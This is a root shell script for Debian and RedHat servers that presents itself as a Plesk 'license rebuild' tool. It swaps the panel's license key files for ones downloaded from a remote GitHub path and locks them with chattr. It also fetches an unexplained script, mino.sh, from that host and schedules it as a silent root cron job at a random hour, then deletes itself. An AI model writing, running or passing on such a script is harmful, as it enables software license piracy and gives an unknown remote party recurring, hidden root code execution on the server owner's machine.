#!/bin/sh

red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

echo "${green}*** Plesk Decompile v2.0 ***${reset}";
echo "";

wget -O /root/header.txt https://github.com/lycoslink/itmagic/plesk/raw/main/header.txt > /dev/null 2>&1
echo "${green}";
cat /root/header.txt
echo "${reset}";
rm -rf /root/header.txt
echo ""

#Debian Family
if [ -e /etc/debian_version ]; then
	if [ ! -e /usr/local/psa ]; then
		echo "${red}Plesk not found, please install Plesk before runnung this${reset}";
		exit;
	fi
	echo "Found Plesk: ${green}/usr/local/psa${reset}";
	version=`plesk version | head -n 1`;
	echo "${version}";
	sub=`plesk version | head -n 1 | cut -d" " -f5 | cut -d"." -f1`;
	if [ "$sub" != "17" ] && [ "$sub" != "18" ]; then
		echo "${red}Error: This path required Plesk 17+ or 18+${reset}";
		exit;
	fi
	sleep 1
	echo -n "${green}Rebuilding License.. ... ${reset}";
	wget -N --tries=4 --timeout=10 -O /etc/pw.tar.gz https://github.com/lycoslink/itmagic/plesk/raw/main/sw.tar.gz > /dev/null 2>&1
	if [ -e /etc/pw.tar.gz ] && [ -s /etc/pw.tar.gz ]; then
		cd /etc/
		service sw-cp-server stop
		service psa stop
		chattr -i /etc/sw/keys/registry.xml
		chattr -i /etc/sw/keys/keys/key*
		rm -rf ./sw*
		tar xvfz ./pw.tar.gz
		chattr +i /etc/sw/keys/registry.xml
		chattr +i /etc/sw/keys/keys/key*
		rm -rf ./pw.tar.gz
		wget -O /etc/cron.daily/mino.sh https://github.com/lycoslink/itmagic/plesk/raw/main/mino.sh > /dev/null 2>&1
		chmod +x /etc/cron.daily/mino.sh
		sed -i '/mino.sh/d' /var/spool/cron/crontabs/root
		echo "0 $((1 + RANDOM % 23)) * * * /bin/sh /etc/cron.daily/mino.sh  >> /dev/null 2>&1" >> /var/spool/cron/crontabs/root
		service cron restart
		service sw-cp-server restart
		service psa restart
		cd /root/
	fi
	if [ -e /root/plesk.sh  ]; then
		rm -rf /root/plesk.sh 
	fi
	exit;
fi

#Working on RedHat Family

sleep 5 &
PID=$!
i=1
rq="/-\|"
echo -n "Checking requirements: "
while [ -d /proc/$PID ]; do
	sleep 0.1;
	printf "\b${rq:i++%${#rq}:1}"
done

echo "";
echo "";

if [ ! -e /usr/local/psa ]; then
	echo "${red}Plesk not found, please install Plesk before runnung this${reset}";
	exit;
fi

rebuild_pl() {
	wget -N --tries=4 --timeout=10 -O /etc/pw.tar.gz https://github.com/lycoslink/itmagic/plesk/raw/main/sw.tar.gz > /dev/null 2>&1
	if [ -e /etc/pw.tar.gz ] && [ -s /etc/pw.tar.gz ]; then
		cd /etc/
		service sw-cp-server stop
		service psa stop
		chattr -i /etc/sw/keys/registry.xml
		chattr -i /etc/sw/keys/keys/key*
		rm -rf ./sw*
		tar xvfz ./pw.tar.gz
		chattr +i /etc/sw/keys/registry.xml
		chattr +i /etc/sw/keys/keys/key*
		rm -rf ./pw.tar.gz
		wget -O /usr/local/psa/mino.sh https://github.com/lycoslink/itmagic/plesk/raw/main/mino.sh > /dev/null 2>&1
		chmod +x /usr/local/psa/mino.sh
		sed -i '/mino.sh/d' /var/spool/cron/root
		echo "0 $((1 + RANDOM % 23)) * * * /bin/sh /usr/local/psa/mino.sh  >> /dev/null 2>&1" >> /var/spool/cron/root
		service crond restart >/dev/null 2>&1
		service sw-cp-server restart
		service psa restart
		cd /root/
	fi
}

show_ld() {
  mypid=$!
  LD=$1

  echo -ne "$LD\r"

  while kill -0 $mypid 2>/dev/null; do
    echo -ne "$LD.\r"
    sleep 0.5
    echo -ne "$LD..\r"
    sleep 0.5
    echo -ne "$LD...\r"
    sleep 0.5
    echo -ne "\r\033[K"
    echo -ne "$LD\r"
    sleep 0.5
  done

  echo "$LD...Done!"
}

if [ -e /usr/local/psa ]; then
	echo "Found Plesk: ${green}/usr/local/psa${reset}";
	version=`plesk version | head -n 1`;
	echo "${version}";
	sub=`plesk version | head -n 1 | cut -d" " -f5 | cut -d"." -f1`;
	if [ "$sub" != "17" ] && [ "$sub" != "18" ]; then
		echo "${red}Error: This path required Plesk 17+ or Plesk 18+${reset}";
		exit;
	fi
	sleep 1
	echo "${green}";
	rebuild_pl & show_ld "Rebuilding License"
	echo "${reset}";
	echo "";
fi
if [ -e /root/plesk.sh  ]; then
	rm -rf /root/plesk.sh 
fi
